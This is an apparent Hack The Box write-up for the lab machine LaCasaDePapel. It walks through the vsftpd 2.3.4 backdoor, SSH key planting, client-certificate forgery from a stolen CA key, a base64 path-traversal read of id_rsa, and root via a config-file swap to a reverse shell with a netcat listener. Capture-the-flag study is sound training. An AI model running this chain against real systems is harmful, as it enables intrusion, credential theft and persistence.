## Scanning

We put the IP in `/etc/hosts`:

```txt
10.10.10.131 lacasadepapel.htb
```

Run Nmap:

```txt

## Enumeration

The FTP has the service `vsftpd 2.3.4` which is known for its smiley `:)` [vulnerability](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html). This, in some cases opens a backdoor shell at port 6200, which is the case!

Let's try it:

```bash
ftp lacasadepapel.htb
# user: root:)
# pass: root:)
```

{{< img "ftp.png" "FTP" "border" >}}

This got stuck, so now we may connect to the binding backdoor shell.

## PSYSH Shell

```
telnet lacasadepapel.htb 6200
```

{{< img "psy.png" "PSYSH" "border" >}}

This time the backdoor is a **psysh** shell, more info. on [their page](https://psysh.org).

To list commands `help` is our hero:

{{< img "help.png" "Help" "border" >}}

{{< img "tokyo.png" "Tokyo" "border" >}}

This seems to be opening a Certificate Authority and saving it's content in `$caKey`:

{{< img "private.png" "Private Key" "border" >}}

Let's save it without the `` and continue exploring the machine.

Trying to access `/etc/passwd`:

{{< img "passwd.png" "PassWd" "border" >}}

Reveals the users: **Dali**, **Berlin**, **Professor**. And Dali seems to be the only one using the psysh shell, so... we are running as Dali.

{{< img "scan.png" "Scandir" "border" >}}

We see there's an `authorized_keys` file, so we can put our SSH public key in case we don't want to repeat the backdoor process:

```php
file_put_contents('/home/dali/.ssh/authorized_keys','OUR PUBLIC KEY')
```

And SSH in:

{{< img "sshDali.png" "SSH Dali" "border" >}}

As we've gotten the `CA.key`, let's go to the HTTPS page:

{{< img "https.png" "HTTPS" "border" >}}

By the way, cool Dali logo!:

{{< img "dali.jpg" "Dali!" "border" >}}

## Client Certificate Authentication

The page tells us we need the client certificate to proceed. You usually connect to a webpage and the client (browser) checks the validity of the server encryption (HTTPS) with its certificate (that also checks the identity of the server). If everything goes fine, you can connect without any warning.

But there's the case that the server asks the client its (client) certificate to verify his identity as an additional security measure. This is called **Client Certificate Authentication**, and is a mutual certificate-based authentication. This is exactly what the page is asking to allow us access.

To access the page, we need that client certificate. **We can get one from the Certificate Authority's private key** we've gotten before (the `ca.key`). We also need the server-side certificate, which can be obtained by clicking the lock icon (near the URL), then *Show connection Details*, *More Information*, *View Certificate*, *Details*, and finally *Export*.

{{< img "serverCertificate.png" "Server Certificate" "border" >}}

Now let's confirm that the `ca.key` we have, was used to sign the server certificate.
We can do such by verifying both file public keys with [OpenSSL](https://www.openssl.org) (general utility for securing communications):

```
$ openssl pkey -in ca.key -pubout | md5sum
71e2b2ca7b610c24d132e3e4c06daf0c  -

$ openssl x509 -in lacasadepapel_htb.crt -pubkey -noout | md5sum
71e2b2ca7b610c24d132e3e4c06daf0c  -
```

They are the same so we confirm our suspicions.

> The *x509* parameter is used as a multi purpose certificate utility.

> The *-noout* omits outputting the encoded version of the private key.

Now let's generate the client certificate, the steps are:

* Generating a *Client Private key*:
```
openssl genrsa -out client.key 4096
```

* Using the *Client Private key* to generate a *Cert Request*:

```
openssl req -new -key client.key -out client.req
```

{{< img "openssl.png" "OpenSSL" "border" >}}

* Finally, asking for a Client Certificate using the *Cert Request* and the `ca.key`:

```
openssl x509 -req -in client.req -CA lacasadepapel_htb.crt -CAkey ca.key -set_serial 101 -extensions client -days 365 -outform PEM -out client.cer
```

> The *set_serial* parameter is used to uniquely identify each certificate.

> The *extensions* parameter is used to identify if the certificate is oriented towards a *server* or a *client*.

> The *days* parameter is used to set how many days the certificate is going to be valid.

> The *outform* parameter is used to set the encoding of the file outputted, in this case is PEM, but could be DER for example.

After all of this we just need to convert the certificate to be valid for use with Windows or macOS, and therefore with our browsers ([PKCS12](https://en.wikipedia.org/wiki/PKCS_12)):

```
openssl pkcs12 -export -in client.cer -inkey client.key -out client.p12
```

It will ask for a password, while this usually is optional, for Burp Suite is mandatory, so set up the password you want.

And the final step is to import it to Firefox (in my case): *Menu*, *Preferences*, *Privacy & Security*, *View Certificates*, *My certificates*, *Import*.

It will ask for the password you entered before.

Reload the page and we'll have access:

## Local File Inclusion (LFI)

When entering "SEASON-01", the url changes to `?path=`:

```
https://lacasadepapel.htb/?path=SEASON-1
```

So there might be a LFI:

{{< img "LFI.png" "Local File Inclusion" "border" >}}

We can supossedly download each episode:

{{< img "download.png" "Download link" "border" >}}

We see between the files the name changes in only a character, so it seems to be filename related and is encoded in base64.

Changing the filename from `SEASON-1/06.avi` to `../user.txt` or `../.ssh/id_rsa` might help us grab the files we need:

{{< img "base64.png" "Base64" "border" >}}

Bingo! So we can get `user.txt` and `id_rsa`, which is the private key for SSH, by just adding its LFI in base64 to the url:

```
https://lacasadepapel.htb/file/

# For example (../.ssh/id_rsa):

https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E=
```

To SSH as Berlin, which is the user from where we've gotten those files:

```
ssh -i id_rsa berlin@lacasadepapel.htb
```

But it didn't work :(

We have to search in other users, and as there were only 3 (Dali, Berlin and Professor), maybe login as Professor is the key.

{{< img "professor.png" "Professor" "border" >}}

got it hehe boi üòè

The certificate has permission too open so we need to modify it to only Read by Owner (400):

```
chmod 400 id_rsa
```

That is: `r------` permissions.

It's easier to remember permissions as follow:

```
 rwx     rwx     rwx
 |||     |||     |||
 421     421     421

owner   group   other
```

## Privilege Escalation (Root)

Running [`pspy32`](https://github.com/DominicBreuker/pspy) this line appears (might be after a long while, as was my case):

{{< img "pspy.png" "PSPY32" "border" >}}

In the `professor` directory there are two files: *memcached.ini* and *memcached.js*:

{{< img "memcached.png" "Memcached file" "border" >}}

We are able to read *memcached.ini*:

```
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```

As we can't modify the file, what we can do is copy the file with another name, modify it and then overwrite the original. All because we own the `professor` directory and have read and write permissions on it.

So I copied *memcached.ini* to *test.ini* and modified that file putting a reverse shell in the command section, then overwrote the original:

```
cp memcached.ini test.ini
vi test.ini
# This machine doesn't have nano
# Write the reverse...
mv test.ini memcached.ini
```

And we just have to wait for our netcat listener to get the connection:

```
nc -lnvp 4444
```
